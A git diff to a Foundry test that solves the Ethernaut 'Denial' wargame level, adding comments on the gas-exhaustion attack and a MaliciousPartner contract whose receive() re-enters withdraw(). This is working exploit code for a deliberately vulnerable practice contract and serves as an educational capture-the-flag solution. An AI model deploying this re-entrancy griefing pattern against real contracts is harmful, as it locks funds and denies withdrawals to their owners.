@@ -29,11 +29,31 @@ contract DenialTest is Test {
         // LEVEL ATTACK //
         //////////////////
 
+        // At each withdraw, 1% of the contract balance is sent to the partner through a call
+        // and 1% is sent to the owner through a transfer.
+        // Transfer is limited to 2300 gas, so if the partner is a contract that calls withdraw
+        // again, the owner will not receive their share as it will run out of gas through an infinite loop.
+        // It is possible to image different scenarios to consume all the gas of the transfer.
+        address maliciousPartner = address(new MaliciousPartner(ethernautDenial));
+        ethernautDenial.setWithdrawPartner(maliciousPartner);
+
         //////////////////////
         // LEVEL SUBMISSION //
         //////////////////////
         bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelSuccessfullyPassed);
+    }
+}
+
+contract MaliciousPartner {
+    Denial denial;
+
+    constructor(Denial _denial) payable {
+        denial = _denial;
+    }
+
+    receive() external payable {
+        denial.withdraw();
     }
 }
